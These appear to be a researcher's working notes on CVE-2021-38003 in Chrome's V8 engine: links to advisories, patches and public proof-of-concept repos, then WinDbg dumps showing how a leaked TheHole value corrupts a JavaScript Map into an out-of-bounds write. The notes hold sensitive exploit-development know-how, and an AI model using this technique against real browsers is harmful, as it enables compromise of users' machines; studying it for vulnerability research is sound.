https://developer.microsoft.com/zh-cn/windows/downloads/sdk-archive/

https://learn.microsoft.com/en-us/answers/questions/1465465/windows-sdkwindows-sdk-version-10-0-19041-0-could


https://issues.chromium.org/issues/40057710

https://chromium.googlesource.com/v8/v8/+/a4252db3228433fed5c2bdb0fdff9a6b7b638f3b

https://codereview.qt-project.org/c/qt/qtwebengine-chromium/+/381001/2

https://blog.google/threat-analysis-group/protecting-android-users-from-0-day-attacks/8

https://support.google.com/chrome/a/answer/6271282?hl=en

https://cwresearchlab.co.kr/entry/CVE-2021-38003-JSONstringify-leaks-TheHole-value-leading-to-RCE




https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/

https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f307

https://www.filepuma.com/download/google_chrome_64bit_94.0.4606.61-30029/

https://chromium-review.googlesource.com/c/v8/v8/+/3247033

https://issues.chromium.org/issues/40057710

https://chromium.googlesource.com/v8/v8/+/7ada005dde022748902728896f5daafc861faea0

https://chromium.googlesource.com/v8/v8/+/5ea70a0088c192cc9a446f6e50915bee605fe84a (vulnerable version)

0:050> x chrome!*wasm_memory_protection_keys*
00007ff8`e1677682 chrome!v8::internal::FLAGDEFAULT_wasm_memory_protection_keys = false
00007ff8`e2481192 chrome!v8::internal::FLAG_wasm_memory_protection_keys = false
00007ff8`dc19b0f6 chrome!v8::internal::Counters::wasm_memory_protection_keys_support =  (inline caller) chrome!v8::internal::wasm::WasmEngine::NewNativeModule+206
0:050> x chrome!*wasm_memory_protection_keys*
00007ff8`e1677682 chrome!v8::internal::FLAGDEFAULT_wasm_memory_protection_keys = false
00007ff8`e2481192 chrome!v8::internal::FLAG_wasm_memory_protection_keys = false
00007ff8`dc19b0f6 chrome!v8::internal::Counters::wasm_memory_protection_keys_support =  (inline caller) chrome!v8::internal::wasm::WasmEngine::NewNativeModule+206
0:050> dd chrome L1
00007ff8`d8260000  00785a4d
0:050> dq 00007ff8`e1677682 L1 // chrome+09417682
00007ff8`e1677682  74636574`6f727000
0:050> dq 00007ff8`e2481192 L1 // chrome+0a221192
00007ff8`e2481192  00000000`00000000

95.0.4638.54

https://www.numencyber.com/from-leaking-thehole-to-chrome-renderer-rce-2/

- [NumenCyber Writeup](https://www.numencyber.com/from-leaking-thehole-to-chrome-renderer-rce-2/), [NumenCyber GitHub](https://github.com/numencyber/Vulnerability_PoC)

- [StarLabs Writeup](https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/), [StarLabs GitHub](https://github.com/star-sg/CVE/blob/master/CVE-2021-38003/pwn.js)

- [CW Research Lab](https://cwresearchlab.co.kr/entry/CVE-2021-38003-JSONstringify-leaks-TheHole-value-leading-to-RCE)

- [CITW Exploits](https://github.com/SpiralBL0CK/Chrome-V8-RCE-CVE-2021-38003)


empty hash table has 2 buckets as per this chinese website https://cn-sec.com/archives/1305000.html

https://itnext.io/v8-deep-dives-understanding-map-internals-45eb94a183df

0 0 4

0:009> dds 0x001a080877a9-1
0000001a`080877a8  08040b4d
0000001a`080877ac  00000022
0000001a`080877b0  00000000    elemen size: 0
0000001a`080877b4  00000000    delete size: 0
0000001a`080877b8  00000004    bucket size: 2
0000001a`080877bc  fffffffe    bucket 0: -1 (-2/2 = -1)
0000001a`080877c0  fffffffe    bucket 1: -1 (-2/2 = -1)
0000001a`080877c4  08040305
0000001a`080877c8  08040305
0000001a`080877cc  08040305
0000001a`080877d0  08040305
0000001a`080877d4  08040305
0000001a`080877d8  08040305
0000001a`080877dc  08040305
0000001a`080877e0  08040305
0000001a`080877e4  08040305
0000001a`080877e8  08040305
0000001a`080877ec  08040305
0000001a`080877f0  08040305

2 0 4 map3.set(0, 0x41414141)

0:009> dds 0x001a080877a9-1
0000001a`080877a8  08040b4d
0000001a`080877ac  00000022
0000001a`080877b0  00000002 elemen size: 1
0000001a`080877b4  00000000 delete size: 0
0000001a`080877b8  00000004 bucket size: 2
0000001a`080877bc  fffffffe bucket 0: -1 
0000001a`080877c0  00000000 bucket 1: 0
0000001a`080877c4  00000000 key: 0
0000001a`080877c8  08211a29 value: 0000001a08211a29
0000001a`080877cc  fffffffe next chain: -1
0000001a`080877d0  08040305
0000001a`080877d4  08040305
0000001a`080877d8  08040305
0000001a`080877dc  08040305
0000001a`080877e0  08040305
0000001a`080877e4  08040305
0000001a`080877e8  08040305
0000001a`080877ec  08040305
0000001a`080877f0  08040305

4 0 4 map3.set(1, 0x41414141)

0:009> dds 0x001a080877a9-1
0000001a`080877a8  08040b4d
0000001a`080877ac  00000022
0000001a`080877b0  00000004 elemen size: 2
0000001a`080877b4  00000000 delete size: 0
0000001a`080877b8  00000004 bucket size: 2
0000001a`080877bc  00000002 bucket 0: 1
0000001a`080877c0  00000000 bucket 1: 0
0000001a`080877c4  00000000 key: 0
0000001a`080877c8  08211a29 value: 0000001a08211a29
0000001a`080877cc  fffffffe next chain: -1
0000001a`080877d0  00000002 key: 1
0000001a`080877d4  08211b55 value: 0000001a08211b55
0000001a`080877d8  fffffffe next chain: -1
0000001a`080877dc  08040305
0000001a`080877e0  08040305
0000001a`080877e4  08040305
0000001a`080877e8  08040305
0000001a`080877ec  08040305
0000001a`080877f0  08040305

6 0 4 map3.set(2, 0x42424242)

0:009> dds 0x001a080877a9-1
0000001a`080877a8  08040b4d
0000001a`080877ac  00000022
0000001a`080877b0  00000006 
0000001a`080877b4  00000000
0000001a`080877b8  00000004
0000001a`080877bc  00000002 bucket 0: 1
0000001a`080877c0  00000004 bucket 1: 2
0000001a`080877c4  00000000 
0000001a`080877c8  08211a29
0000001a`080877cc  fffffffe
0000001a`080877d0  00000002 
0000001a`080877d4  08211b55
0000001a`080877d8  fffffffe
0000001a`080877dc  00000004 
0000001a`080877e0  08211c81
0000001a`080877e4  00000000
0000001a`080877e8  08040305
0000001a`080877ec  08040305
0000001a`080877f0  08040305

4 2 4 map3.delete(2)

0:009> dds 0x001a080877a9-1
0000001a`080877a8  08040b4d
0000001a`080877ac  00000022
0000001a`080877b0  00000004 elemen: 2
0000001a`080877b4  00000002 delete: 1
0000001a`080877b8  00000004 bucket: 2
0000001a`080877bc  00000002 bucket: 1
0000001a`080877c0  00000004 bucket: 2
0000001a`080877c4  00000000 key: 0
0000001a`080877c8  08211a29 value: 
0000001a`080877cc  fffffffe chain: -1
0000001a`080877d0  00000002 key: 1
0000001a`080877d4  08211b55 value
0000001a`080877d8  fffffffe chain: -1
0000001a`080877dc  0804037d DELETED?
0000001a`080877e0  0804037d DELETED?
0000001a`080877e4  00000000 DELETED?
0000001a`080877e8  08040305
0000001a`080877ec  08040305
0000001a`080877f0  08040305

//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

in chrome?

```
var map2 = new Map();
%DebugPrint(map2);
map2.set(1, 1);
alert("map2.set(1, 1);")
map2.set(2, 1);
alert("map2.set(2, 1);")
map2.set(3, 1);
alert("map2.set(3, 1);")
map2.delete(1);
alert("map2.delete(1);");
map2.delete(1);
alert("map2.delete(1);");
alert(map2.size);
```

0:007> dds 000042cc`27b099ac
000042cc`27b099ac  08002bfd
000042cc`27b099b0  00000022
000042cc`27b099b4  00000006 entry: 3
000042cc`27b099b8  00000000 delet: 0
000042cc`27b099bc  00000004 bucke: 2
000042cc`27b099c0  00000004 bucket 1: 2
000042cc`27b099c4  00000002 bucket 2: 1
000042cc`27b099c8  00000002 
000042cc`27b099cc  00000002
000042cc`27b099d0  fffffffe
000042cc`27b099d4  00000004
000042cc`27b099d8  00000002
000042cc`27b099dc  fffffffe
000042cc`27b099e0  00000006
000042cc`27b099e4  00000002
000042cc`27b099e8  00000000
000042cc`27b099ec  080023b5
000042cc`27b099f0  080023b5
000042cc`27b099f4  080023b5

delete

0:007> dds 000042cc`27b099ac
000042cc`27b099ac  08002bfd
000042cc`27b099b0  00000022
000042cc`27b099b4  00000004 entry: 2
000042cc`27b099b8  00000002 delet: 1
000042cc`27b099bc  00000004 bucke: 2
000042cc`27b099c0  00000004 bucket 1: 2
000042cc`27b099c4  00000002 bucket 2: 1
000042cc`27b099c8  0800242d // deleted marker? <- this is actually TheHole value
000042cc`27b099cc  0800242d // deleted marker?
000042cc`27b099d0  fffffffe // deleted marker?
000042cc`27b099d4  00000004
000042cc`27b099d8  00000002
000042cc`27b099dc  fffffffe
000042cc`27b099e0  00000006
000042cc`27b099e4  00000002
000042cc`27b099e8  00000000
000042cc`27b099ec  080023b5
000042cc`27b099f0  080023b5
000042cc`27b099f4  080023b5

delete

000042cc`27b099ac  08002bfd
000042cc`27b099b0  00000022
000042cc`27b099b4  00000004
000042cc`27b099b8  00000002
000042cc`27b099bc  00000004
000042cc`27b099c0  00000004
000042cc`27b099c4  00000002
000042cc`27b099c8  0800242d
000042cc`27b099cc  0800242d
000042cc`27b099d0  fffffffe
000042cc`27b099d4  00000004
000042cc`27b099d8  00000002
000042cc`27b099dc  fffffffe
000042cc`27b099e0  00000006
000042cc`27b099e4  00000002
000042cc`27b099e8  00000000
000042cc`27b099ec  080023b5
000042cc`27b099f0  080023b5
000042cc`27b099f4  080023b5

//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

in chrome?

set(1,1)

000042cc`0ab96d60  08002bfd
000042cc`0ab96d64  00000022
000042cc`0ab96d68  00000002
000042cc`0ab96d6c  00000000
000042cc`0ab96d70  00000004
000042cc`0ab96d74  00000000
000042cc`0ab96d78  fffffffe
000042cc`0ab96d7c  00000002
000042cc`0ab96d80  00000002
000042cc`0ab96d84  fffffffe
000042cc`0ab96d88  080023b5
000042cc`0ab96d8c  080023b5
000042cc`0ab96d90  080023b5
000042cc`0ab96d94  080023b5
000042cc`0ab96d98  080023b5
000042cc`0ab96d9c  080023b5
000042cc`0ab96da0  080023b5
000042cc`0ab96da4  080023b5
000042cc`0ab96da8  080023b5

set(TheHole,1)

000042cc`0ab96d60  08002bfd
000042cc`0ab96d64  00000022
000042cc`0ab96d68  00000004
000042cc`0ab96d6c  00000000
000042cc`0ab96d70  00000004
000042cc`0ab96d74  00000002
000042cc`0ab96d78  fffffffe
000042cc`0ab96d7c  00000002
000042cc`0ab96d80  00000002
000042cc`0ab96d84  fffffffe
000042cc`0ab96d88  0800242d <- TheHole value (key)
000042cc`0ab96d8c  00000002
000042cc`0ab96d90  00000000
000042cc`0ab96d94  080023b5
000042cc`0ab96d98  080023b5
000042cc`0ab96d9c  080023b5
000042cc`0ab96da0  080023b5
000042cc`0ab96da4  080023b5
000042cc`0ab96da8  080023b5

delete(TheHole)

000042cc`0ab96d60  08002bfd
000042cc`0ab96d64  00000022
000042cc`0ab96d68  00000002
000042cc`0ab96d6c  00000002
000042cc`0ab96d70  00000004
000042cc`0ab96d74  00000002
000042cc`0ab96d78  fffffffe
000042cc`0ab96d7c  00000002
000042cc`0ab96d80  00000002
000042cc`0ab96d84  fffffffe
000042cc`0ab96d88  0800242d <- mark this area as deleted but the thing is that the key is TheHole and the deleted marker is TheHole
000042cc`0ab96d8c  0800242d    Hence, v8 will still believe that there is a value here!!!!
000042cc`0ab96d90  00000000
000042cc`0ab96d94  080023b5
000042cc`0ab96d98  080023b5
000042cc`0ab96d9c  080023b5
000042cc`0ab96da0  080023b5
000042cc`0ab96da4  080023b5
000042cc`0ab96da8  080023b5

delete(TheHole)

0:007> dds 000042cc`0ab96d60 l30
000042cc`0ab96d60  08002bfd <- i think what what happens is that this shit is fked cuz corrupted
000042cc`0ab96d64  00000022
000042cc`0ab96d68  0ab96dad <- go to 0ab96dac
000042cc`0ab96d6c  00000004
000042cc`0ab96d70  00000004
000042cc`0ab96d74  00000002
000042cc`0ab96d78  fffffffe
000042cc`0ab96d7c  00000002
000042cc`0ab96d80  00000002
000042cc`0ab96d84  fffffffe
000042cc`0ab96d88  0800242d
000042cc`0ab96d8c  0800242d
000042cc`0ab96d90  00000000
000042cc`0ab96d94  080023b5
000042cc`0ab96d98  080023b5
000042cc`0ab96d9c  080023b5
000042cc`0ab96da0  080023b5
000042cc`0ab96da4  080023b5
000042cc`0ab96da8  080023b5
000042cc`0ab96dac  08002bfd <- recreate the map over here?
000042cc`0ab96db0  00000022 
000042cc`0ab96db4  00000000 element: 0
000042cc`0ab96db8  00000000 deleted: 0
000042cc`0ab96dbc  00000004 bucket: 2
000042cc`0ab96dc0  00000000 
000042cc`0ab96dc4  fffffffe
000042cc`0ab96dc8  00000002
000042cc`0ab96dcc  00000002
000042cc`0ab96dd0  fffffffe
000042cc`0ab96dd4  080023b5
000042cc`0ab96dd8  080023b5
000042cc`0ab96ddc  080023b5
000042cc`0ab96de0  080023b5
000042cc`0ab96de4  080023b5
000042cc`0ab96de8  080023b5
000042cc`0ab96dec  080023b5
000042cc`0ab96df0  080023b5
000042cc`0ab96df4  080023b5
000042cc`0ab96df8  225c225c
000042cc`0ab96dfc  225c225c
000042cc`0ab96e00  225c225c
000042cc`0ab96e04  225c225c
000042cc`0ab96e08  225c225c
000042cc`0ab96e0c  225c225c
000042cc`0ab96e10  225c225c
000042cc`0ab96e14  225c225c
000042cc`0ab96e18  225c225c
000042cc`0ab96e1c  225c225c

delete(1)

0:007> dds 000042cc`0ab96d60 l30
000042cc`0ab96d60  08002bfd
000042cc`0ab96d64  00000022
000042cc`0ab96d68  0ab96dad <- 0ab96dac
000042cc`0ab96d6c  00000004
000042cc`0ab96d70  00000004
000042cc`0ab96d74  00000002
000042cc`0ab96d78  fffffffe
000042cc`0ab96d7c  00000002
000042cc`0ab96d80  00000002
000042cc`0ab96d84  fffffffe
000042cc`0ab96d88  0800242d
000042cc`0ab96d8c  0800242d
000042cc`0ab96d90  00000000
000042cc`0ab96d94  080023b5
000042cc`0ab96d98  080023b5
000042cc`0ab96d9c  080023b5
000042cc`0ab96da0  080023b5
000042cc`0ab96da4  080023b5
000042cc`0ab96da8  080023b5
000042cc`0ab96dac  08002bfd 
000042cc`0ab96db0  00000022
000042cc`0ab96db4  0ab96df9 <- 0ab96df8
000042cc`0ab96db8  00000002 
000042cc`0ab96dbc  00000004 
000042cc`0ab96dc0  00000000
000042cc`0ab96dc4  fffffffe
000042cc`0ab96dc8  0800242d
000042cc`0ab96dcc  0800242d
000042cc`0ab96dd0  fffffffe
000042cc`0ab96dd4  080023b5
000042cc`0ab96dd8  080023b5
000042cc`0ab96ddc  080023b5
000042cc`0ab96de0  080023b5
000042cc`0ab96de4  080023b5
000042cc`0ab96de8  080023b5
000042cc`0ab96dec  080023b5
000042cc`0ab96df0  080023b5
000042cc`0ab96df4  080023b5
000042cc`0ab96df8  08002bfd <- come here :)
000042cc`0ab96dfc  00000022
000042cc`0ab96e00  fffffffe
000042cc`0ab96e04  00000000
000042cc`0ab96e08  00000004
000042cc`0ab96e0c  fffffffe
000042cc`0ab96e10  fffffffe
000042cc`0ab96e14  080023b5
000042cc`0ab96e18  080023b5
000042cc`0ab96e1c  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c

map.set(0x1c, -1);

000042cc`xxxxxxxx  08002bfd
000042cc`xxxxxxxx  00000022
000042cc`xxxxxxxx  00000000
000042cc`xxxxxxxx  00000000
000042cc`xxxxxxxx  00000038 0x1c
000042cc`xxxxxxxx  fffffffe -1
000042cc`xxxxxxxx  fffffffe
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c

map.set(0x2c, -2);

000042cc`xxxxxxxx  08002bfd
000042cc`xxxxxxxx  00000022
000042cc`xxxxxxxx  00000000
000042cc`xxxxxxxx  00000000
000042cc`xxxxxxxx  00000058 0x2c
000042cc`xxxxxxxx  fffffffc -2
000042cc`xxxxxxxx  fffffffe
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  080023b5
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`xxxxxxxx  225c225c
000042cc`108a6edc  225c225c

0:003> g
(1598.ca8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Google\Chrome\Application\95.0.4638.54\chrome.dll - 
chrome_7ffe62b90000!GetHandleVerifier+0x1f7e0a8:
00007ffe`668dff18 438b5c3813      mov     ebx,dword ptr [r8+r15+13h] ds:000042cc`deb33d64=????????

probably fail some boundary check or some shizz


hash_table_index = hashcode(key) & (bucket_count-1) needs to be 0 as we set the bucket0 and hence hashTable[0] to -1

0:006> dds 00007cd5`1243c3a8 l50
00007cd5`xxxxxxxx  08002bfd
00007cd5`xxxxxxxx  00000022
00007cd5`xxxxxxxx  00000002
00007cd5`xxxxxxxx  00000000
00007cd5`xxxxxxxx  00000038
00007cd5`xxxxxxxx  00000000
00007cd5`xxxxxxxx  fffffffe
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  080023b5
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  00000222 <- oob write hehehehehehe
00007cd5`xxxxxxxx  00000000
00007cd5`xxxxxxxx  fffffffe
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
00007cd5`xxxxxxxx  225c225c
